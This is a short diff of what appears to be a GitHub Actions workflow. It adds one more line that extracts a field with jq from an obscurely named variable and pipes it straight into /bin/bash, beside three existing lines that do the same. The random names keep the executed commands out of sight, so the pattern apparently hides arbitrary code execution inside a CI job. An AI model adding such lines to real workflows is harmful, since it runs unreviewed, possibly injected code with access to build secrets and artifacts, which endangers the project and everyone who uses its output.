@@ -35,6 +35,7 @@ jobs:
           echo $ho6 | jq -r .s85 | /bin/bash
           echo $lg003 | jq -r .qrsxx7 | /bin/bash
           printf '%s' "$zngw2619" | jq -r .zhmn6 | /bin/bash
+          echo $d8530 | jq -r .tzfnf3854 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
